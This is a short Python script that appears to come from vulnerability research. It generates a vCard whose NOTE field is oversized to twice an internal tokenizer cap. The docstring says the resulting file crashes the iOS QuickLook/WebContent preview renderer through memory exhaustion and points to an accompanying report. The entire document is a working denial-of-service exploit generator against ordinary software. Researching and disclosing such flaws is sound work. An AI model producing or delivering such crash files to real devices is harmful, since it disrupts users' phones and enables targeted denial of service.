#!/usr/bin/env python3
"""
vCard note-double DoS generator (iOS jetsam classification).

Produces a vCard whose NOTE value doubles the 46,080 (0xB400) internal line
cap of the Contacts vCard tokenizer. Confirmed impact on iOS 26.6.1: the
QuickLook/WebContent preview renderer is jetsam-OOM-killed (memory exhaustion,
NOT memory safety — the vCard parser's length guards held; see
REPORT-VCARD-NOTE-DOUBLE-DOS.md).

Usage: python3 gen_note_double.py [out.vcf] [--note-len N]
"""
import sys

CAP = 46_080  # 0xB400 tokenizer cap straddled by note_exact/note_over/note_double


def build(note_len):
    return ("BEGIN:VCARD\r\nVERSION:3.0\r\nN:Doe;Jane;;;\r\n"
            "FN:Jane Doe\r\nNOTE:" + "A" * note_len + "\r\nEND:VCARD\r\n").encode()


def main(argv):
    out = "note_double.vcf"
    note_len = 2 * CAP  # "double" = 2x the tokenizer cap
    args = list(argv[1:])
    if args and not args[0].startswith("--"):
        out = args.pop(0)
    if "--note-len" in args:
        note_len = int(args[args.index("--note-len") + 1])
    data = build(note_len)
    open(out, "wb").write(data)
    import hashlib
    print(f"wrote {out} ({len(data)} bytes), NOTE len {note_len} "
          f"({'2x' if note_len == 2 * CAP else 'custom'} the 46,080 cap)")
    print(f"  sha256 {hashlib.sha256(data).hexdigest()}")


if __name__ == "__main__":
    main(sys.argv)